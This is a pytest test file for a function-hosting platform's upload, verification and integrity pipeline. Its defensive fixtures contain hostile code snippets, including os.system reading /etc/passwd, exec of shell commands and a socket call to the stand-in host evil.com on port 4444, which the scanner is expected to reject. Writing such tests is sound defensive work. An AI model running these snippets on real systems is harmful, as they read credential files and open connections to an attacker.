"""Tests for the verification and preparation pipeline (Member 2).

Covers:
- benign function: passes all checks and reaches READY.
- malicious functions: various patterns that should be rejected.
- integrity check: tampered package is caught.
- invoke placeholder: 503 before Member 3 is wired in.
"""

from __future__ import annotations

import io
import zipfile

import pytest


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _make_zip(files: dict[str, str]) -> bytes:
    """Create an in-memory ZIP containing files ({name: content})."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, content in files.items():
            zf.writestr(name, content)
    return buf.getvalue()


def _register_and_login(client, username: str, password: str = "SecurePass123") -> str:
    client.post("/auth/register", json={"username": username, "password": password})
    r = client.post("/auth/login", json={"username": username, "password": password})
    return r.json()["access_token"]


def _auth(token: str) -> dict:
    return {"Authorization": f"Bearer {token}"}


# ---------------------------------------------------------------------------
# Benign function
# ---------------------------------------------------------------------------

BENIGN_CODE = '''\
def handler(event=None):
    event = event or {}
    return {"message": f"Hello, {event.get('name', 'world')}!"}
'''


def test_benign_function_reaches_ready(client):
    token = _register_and_login(client, "benign_user_v")
    pkg = _make_zip({"main.py": BENIGN_CODE})

    # Upload
    r = client.post(
        "/functions",
        data={"name": "hello"},
        files={"package": ("hello.zip", pkg, "application/zip")},
        headers=_auth(token),
    )
    assert r.status_code == 201, r.text
    assert r.json()["status"] == "UPLOADED"

    # Verify (triggers the full pipeline)
    r = client.post("/functions/hello/verify", headers=_auth(token))
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["status"] == "READY"
    assert body["invoke_url"] is not None
    assert body["invoke_url"].startswith("/invoke/")

    # GET detail shows invoke token
    r = client.get("/functions/hello", headers=_auth(token))
    assert r.status_code == 200
    assert r.json()["invoke_token"] is not None


# ---------------------------------------------------------------------------
# Malicious functions — should be REJECTED
# ---------------------------------------------------------------------------

EVAL_CODE = 'result = eval(input("cmd: "))\n'
EXEC_CODE = 'exec("import os; os.system(\'id\')")\n'
OS_SYSTEM_CODE = 'import os\nos.system("cat /etc/passwd")\n'
SUBPROCESS_CODE = 'import subprocess\nsubprocess.run(["id"])\n'
SOCKET_CODE = 'import socket\ns = socket.socket()\ns.connect(("evil.com", 4444))\n'
IMPORT_SOCKET_CODE = 'from socket import socket as S\n'


@pytest.mark.parametrize("name,code,expected_fragment", [
    ("eval_usage",       EVAL_CODE,          "eval"),
    ("exec_usage",       EXEC_CODE,          "exec"),
    ("os_system",        OS_SYSTEM_CODE,     "os.system"),
    ("subprocess_usage", SUBPROCESS_CODE,    "subprocess"),
    ("socket_usage",     SOCKET_CODE,        "socket"),
    ("from_socket",      IMPORT_SOCKET_CODE, "socket"),
])
def test_malicious_code_rejected(client, name, code, expected_fragment):
    username = f"mal_{name}"
    token = _register_and_login(client, username)
    pkg = _make_zip({"main.py": code})

    r = client.post(
        "/functions",
        data={"name": name},
        files={"package": ("pkg.zip", pkg, "application/zip")},
        headers=_auth(token),
    )
    assert r.status_code == 201

    r = client.post(f"/functions/{name}/verify", headers=_auth(token))
    assert r.status_code == 422, \
        f"Expected rejection for {name}, got {r.status_code}: {r.text}"
    assert expected_fragment in r.json()["detail"].lower(), r.json()


# ---------------------------------------------------------------------------
# Integrity check — tampered package
# ---------------------------------------------------------------------------

def test_integrity_check_catches_tampering(client, monkeypatch):
    from app.storage import StorageIntegrityError

    token = _register_and_login(client, "tamper_user")
    pkg = _make_zip({"main.py": BENIGN_CODE})

    r = client.post(
        "/functions",
        data={"name": "tampered"},
        files={"package": ("t.zip", pkg, "application/zip")},
        headers=_auth(token),
    )
    assert r.status_code == 201

    # Monkey-patch to simulate tampering detected
    import app.storage as storage_mod

    def fake_integrity(path, sha256):
        raise StorageIntegrityError("simulated tamper detected")

    monkeypatch.setattr(storage_mod, "verify_integrity", fake_integrity)

    r = client.post("/functions/tampered/verify", headers=_auth(token))
    assert r.status_code == 500
    assert "integrity" in r.json()["detail"].lower()


# ---------------------------------------------------------------------------
# Invoke placeholder — 503 until Member 3 is connected
# ---------------------------------------------------------------------------

def test_invoke_placeholder_returns_503(client):
    token = _register_and_login(client, "invoke_user_v")
    pkg = _make_zip({"main.py": BENIGN_CODE})

    client.post(
        "/functions",
        data={"name": "invokeme"},
        files={"package": ("p.zip", pkg, "application/zip")},
        headers=_auth(token),
    )
    r = client.post("/functions/invokeme/verify", headers=_auth(token))
    assert r.status_code == 200
    invoke_url = r.json()["invoke_url"]

    r = client.get(invoke_url)
    assert r.status_code == 503


# ---------------------------------------------------------------------------
# Verify unknown function — 404
# ---------------------------------------------------------------------------

def test_verify_unknown_function_returns_404(client):
    token = _register_and_login(client, "ghost_user_v")
    r = client.post("/functions/nonexistent/verify", headers=_auth(token))
    assert r.status_code == 404


# ---------------------------------------------------------------------------
# Re-verify already READY function — 409
# ---------------------------------------------------------------------------

def test_reverify_ready_function_returns_409(client):
    token = _register_and_login(client, "reverify_user")
    pkg = _make_zip({"main.py": BENIGN_CODE})

    client.post(
        "/functions",
        data={"name": "stable"},
        files={"package": ("s.zip", pkg, "application/zip")},
        headers=_auth(token),
    )
    r = client.post("/functions/stable/verify", headers=_auth(token))
    assert r.status_code == 200

    r = client.post("/functions/stable/verify", headers=_auth(token))
    assert r.status_code == 409